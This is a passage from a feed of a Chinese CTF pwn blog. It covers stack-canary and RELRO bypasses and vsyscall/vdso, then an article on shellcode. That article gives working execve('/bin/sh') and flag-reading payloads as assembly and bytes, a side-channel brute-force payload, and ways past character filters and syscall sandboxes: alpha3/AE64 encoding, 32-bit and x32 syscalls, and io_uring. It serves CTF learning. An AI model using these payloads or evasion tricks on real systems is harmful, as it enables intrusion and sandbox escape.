1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x (void*)(pthread_self())</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure><p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p><p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p><h4 id="bypass-Full-RELRO">bypass Full RELRO</h4><p>在没有leak函数，并且Full RELRO 的情况下， ret2dl_resolve就无法使用了。</p><p>因为got不再可写，partial overwrite也无法再使用。</p><p>那么可以找数据移动的gadget将got 表里面的值读入bss段，然后对bss段上的值进行partial overwrite， 或者通过add、sub等gadget拼出目标libc值，再栈迁移到bss段， 就可以ret到lbss段上的libc地址，从而劫持控制流。</p><h3 id="vsyscall-vdso">vsyscall/vdso</h3><p>vsyscall 和 vdso 都是内核留下的用于加速系统调用的接口，也因此，其根据内核版本的不同而有所不同。</p><p>可以随便开一个程序看一下他们各自的加载地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="number">0x7ffff7fc4000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fca000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"> </span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br></pre></td></tr></table></figure><p>先来说vsyscall, 里面实现了三个函数：</p><p>0xffffffffff600000, gettimeofday<br>0xffffffffff600400, time<br>0xffffffffff600800, getcpu</p><p>并且vsyscall 的加载地址是固定的，但是由于其执行有检查，必须从以上三个函数开始的地址来运行，所以也就只能执行以上三个函数，更多的作用是在栈溢出完全无leak时，将此作为gadget滑块，让程序运行到有效libc地址。</p><p>不过，在许多发行版中，这个功能已经被裁剪。</p><p><a href="https://lwn.net/Articles/615809/">vDSO</a></p><p>相对而言灵活很多，他类似与一个共享库，如果你用gdb将其dump下来，会发现他甚至有完整的ELF结构。</p><p>然而，其加载地址却会受到随机化的影响，在32位的程序中，这个随机化的偏移是可爆破的程度，然而在64位的系统中，就完全不可能了。</p><p>不过在loader在加载过程中会在栈上留下其地址，在所有环境变量的上面一点的偏移，如果存在leak，就可以劫持。</p><p>不过，一个更大的问题的，由于这是内核提供的一个接口，vDSO具体内容随内核版本有所不同，除非你能dump出远程的vDSO，否则很难利用。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;杂谈&quot;&gt;杂谈&lt;/h3&gt;
&lt;p&gt;作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="pwn" scheme="https://v3rdant.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.the-Art-of-Shellcode</title>
    <link href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/"/>
    <id>https://v3rdant.cn/Pwn.The-Art-of-Shellcode/</id>
    <published>2022-07-30T16:00:00.000Z</published>
    <updated>2024-02-28T15:02:54.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic">Basic</h1><p>首先给出两个常用shellcode仓库，可以检索需要的shellcode</p><ul><li><a href="https://shell-storm.org/shellcode/index.html">shellcode database</a></li><li><a href="https://www.exploit-db.com/google-hacking-database">exploit-db</a></li></ul><span id="more"></span><p>接下来给出几个尽可能短的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; excve(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,0)</span><br><span class="line">; rax: 0x3b</span><br><span class="line">; rdi: &#x27;/bin/sh&#x27; </span><br><span class="line">; rsi: &#x27;sh&#x27; </span><br><span class="line">; rdx; NULL</span><br></pre></td></tr></table></figure><h2 id="最短shellcode">最短shellcode</h2><h3 id="特征与条件">特征与条件</h3><p>长度为22字节<br>主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r/m64指令，实现清空rax和rdx</p><ul><li>eax 高二位必须为0，一般是满足的</li></ul><h3 id="汇编">汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rsi, rsi</span><br><span class="line">pushrsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">pushrdi</span><br><span class="line">pushrsp</span><br><span class="line">pop    rdi</span><br><span class="line">mov al,59</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi</span><br><span class="line">56                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq     ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br></pre></td></tr></table></figure><h3 id="字节码">字节码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// int</span><br><span class="line">0x622fbf4856f63148</span><br><span class="line">0x545768732f2f6e69</span><br><span class="line">0x050f993bb05f</span><br><span class="line"></span><br><span class="line">// bytes</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure><h2 id="orw">orw</h2><h3 id="特征与条件-2">特征与条件</h3><p>长度为0x28字节<br>主要是通过异或实现了取代了mov减少长度</p><ul><li>rsp指向的地址必须是可用的</li><li>存在NULL字符</li></ul><h3 id="汇编-2">汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// rdx为写入数量</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi  #如果本来rsi=0，可以删掉这句</span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2  </span><br><span class="line">mov eax,edi</span><br><span class="line">syscall  </span><br></pre></td></tr></table></figure><h3 id="字节码-2">字节码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6800000200c2c748</span><br><span class="line">0x31e7894867616c66</span><br><span class="line">0x050f00000002b8f6</span><br><span class="line">0x0fc031e68948c789</span><br><span class="line">0x050ff88902f78305</span><br><span class="line"></span><br><span class="line">\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05</span><br></pre></td></tr></table></figure><h3 id="可指定地址orw">可指定地址orw</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dh, 0x2</span></span><br><span class="line"><span class="string">mov rdi,&#123;&#125;</span></span><br><span class="line"><span class="string">xor esi,esi  </span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rsi,rdi</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(target_addr + <span class="number">0xb0</span>))</span><br></pre></td></tr></table></figure><h2 id="侧信道爆破">侧信道爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">push SYS_open</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, 0x10100</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">cmp cl, dl</span></span><br><span class="line"><span class="string">jz loop</span></span><br><span class="line"><span class="string">mov al,231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="字符限制">字符限制</h1><h2 id="编码工具">编码工具</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">ae64</th><th><a href="https://github.com/SkyLined/alpha3">alpha3</a></th></tr></thead><tbody><tr><td style="text-align:center">Encode x32 alphanumeric shellcode</td><td style="text-align:center">x</td><td>✔</td></tr><tr><td style="text-align:center">Encode x64 alphanumeric shellcode</td><td style="text-align:center">✔</td><td>✔</td></tr><tr><td style="text-align:center">Original shellcode can contain zero bytes</td><td style="text-align:center">✔</td><td>x</td></tr><tr><td style="text-align:center">Base address register can contain offset</td><td style="text-align:center">✔</td><td>x</td></tr></tbody></table><h4 id="Alpha3">Alpha3</h4><p>限制只能使用字母或者数字<br>alpha3使用:<br>alpha3需要python2环境，所以先安装python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x31\xc0\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(sc)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin </span><br></pre></td></tr></table></figure><p>可以选择架构、编码、限制的字符</p><h3 id="AE64">AE64</h3><p>AE64可以直接在python中导入，使用相对较为方便且限制较少</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="手动绕过">手动绕过</h2><p>主要是通过sub、add、xor等指令对于非字母数字指令进行加密。<br>可以先根据限制筛选出受限制后的指令列表，然后根据指令列表进行组合，从而实现绕过。</p><p>另一种方法是通过shellcode先实现write读取到shellcode的位置，然后输入新的无限制的<br>shellcode来完成绕过。</p><p><a href="https://nets.ec/Alphanumeric_shellcode">https://nets.ec/Alphanumeric_shellcode</a></p><h1 id="特定位置字符限制">特定位置字符限制</h1><p>在最近的*CTF中存在一个用浮点数输入字符，并对浮点数做限制写shellcode的题目，实际上是限制了每八位需要有两位是特定字符，这里给出两种绕过思路:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, im64</span><br><span class="line">mov rcx, im32</span><br><span class="line">mov ecx, im32</span><br><span class="line">mov cl, im16</span><br></pre></td></tr></table></figure><p>这里im是可以由我们自由控制的立即数，因此我们可以通过插入这些无关指令填充来绕过限制，上面这些指令涵盖了3、4、5字节，可以灵活插入来达到需要的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short</span><br></pre></td></tr></table></figure><p>通过jmp短跳转直接跳过中间指令，从而绕过限制</p><p>jmp指令本身只有两个字节，更为灵活。</p><h1 id="对于orw的限制">对于orw的限制</h1><p>如果程序还对orw等系统调用作出了限制呢？<br>w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open，orw就  很难进行下去了。<br>但是还有一种方法。</p><h2 id="利用32位调用绕过orw">利用32位调用绕过orw</h2><p>x86与x64的syscall number是不一样的，如果能够跳转到32位执行相应的shellcode，就可一绕过限制。</p><p><strong>x86</strong> <strong>sys_number</strong></p><p>| sys_number  |   |   |   |   |<br>|—|—|—|—|—|—|<br>|3|read|0x03|unsigned int fd|char *buf|size_t count|<br>|4|write|0x04|unsigned int fd|const char *buf|size_t count|<br>|5|open|0x05|const char *filename|int flags|umode_t mode|</p><p>而程序是由32位还是64位执行是由cs寄存器决定的，而retfq指令可以对其作出更改，从而切换寄存器状态，所以可以由此实现orw。</p><p>值得注意的是, 对于32位程序, 由于kernel 也要对其作出相应支持, 所以内核代码中有一个操作系统层面的arch判断, personality, 这会影响mmap之类的操作</p><h2 id="x32-ABI">x32 ABI</h2><p>x32 ABI 是一个应用程序二进制接口 (ABI)，也是 Linux 内核的接口之一。 x32 ABI 在 Intel 和 AMD 64 位硬件上提供 32 位整数、长整数和指针。</p><p>可以通过 查看内核源代码 unistd_x32.h 查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/src/kernels/6.4.7-200.fc38.x86_64/arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UAPI_ASM_UNISTD_X32_H              </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UAPI_ASM_UNISTD_X32_H                </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)           </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)  </span></span><br></pre></td></tr></table></figure><p>即可以通过0x40000000+syscall_number 来调用一些系统调用。所以可以绕过对syscall的限制。</p><p>不过这个特性似乎在大多数发行版中不受支持。</p><h2 id="io-uring">io_uring</h2><p>io_uring 本身可以实现所有orw乃至socket连接操作, 在linux5.xx最少需要<code>mmap</code>和 <code>io_uring_setup</code> 两个syscall, 之后增加了 <code>IORING_SETUP_NOMMAP</code> 则可以只用一个syscall来实现orw</p><h1 id="对于syscall指令的过滤">对于syscall指令的过滤</h1><ul><li>vdso</li><li>sysenter</li><li>int 80</li></ul><h1 id="tricks">tricks</h1><ul><li>对于一些题目，对shellcode的检查用到了strlen，那么可以通过先使用一些存在NULL截断的指令，从而使得后面的字符串绕过限制。</li><li>在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址。在32位程序中，还可以通过call指令获取将运行地址压入栈中，在64位地址中，可以直接通过 <code>lea rax, [rip]</code> 来获取rip地址</li><li>对于需要libc地址的程序，可以考虑通过xmm寄存器获得libc相关地址</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;Basic&lt;/h1&gt;
&lt;p&gt;首先给出两个常用shellcode仓库，可以检索需要的shellcode&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://shell-storm.org/shellcode/index.html&quot;&gt;shellcode database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/google-hacking-database&quot;&gt;exploit-db&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="pwn" scheme="https://v3rdant.cn/tags/pwn/"/>
    
  </entry>
  
</feed>
